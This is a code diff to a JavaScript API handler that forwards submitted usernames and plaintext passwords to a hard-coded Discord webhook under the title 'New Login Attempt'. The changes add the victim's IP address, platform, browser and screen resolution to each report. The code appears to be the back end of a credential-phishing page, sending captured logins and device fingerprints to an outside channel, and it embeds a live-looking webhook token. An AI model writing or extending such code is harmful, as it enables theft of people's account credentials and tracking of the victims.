@@ -5,27 +5,37 @@ export default async function handler(req, res) {
 
     const webhookUrl = "https://discord.com/api/webhooks/1391032347234668624/j4v2bTS3LmLDO0Vaflk1L41T8uXFxe4BHBUs5fvI4OE_E43LH2fpjIxoBVti8ptGojCV";
 
-    const { username, password, timestamp } = req.body;
+    const { username, password, timestamp, ipAddress, browserInfo } = req.body;
 
     const message = {
         username: "Login Bot",
         embeds: [{
-            title: "New Login Attempt",
+            title: "🔐 New Login Attempt",
             color: 0xFF0000,
             fields: [
                 {
-                    name: "Username",
+                    name: "👤 Username",
                     value: username,
                     inline: true
                 },
                 {
-                    name: "Password",
+                    name: "🔑 Password",
                     value: password,
                     inline: true
                 },
                 {
-                    name: "Time",
-                    value: timestamp,
+                    name: "🌐 IP Address",
+                    value: ipAddress,
+                    inline: true
+                },
+                {
+                    name: "⏰ Timestamp",
+                    value: new Date(timestamp).toLocaleString(),
+                    inline: false
+                },
+                {
+                    name: "📱 Device Info",
+                    value: `Platform: ${browserInfo.platform}\nBrowser: ${browserInfo.browser}\nResolution: ${browserInfo.screenResolution}`,
                     inline: false
                 }
             ]
@@ -48,5 +58,4 @@ export default async function handler(req, res) {
         console.error('Webhook Error:', error);
         res.status(500).json({ error: error.message });
     }
-
 }
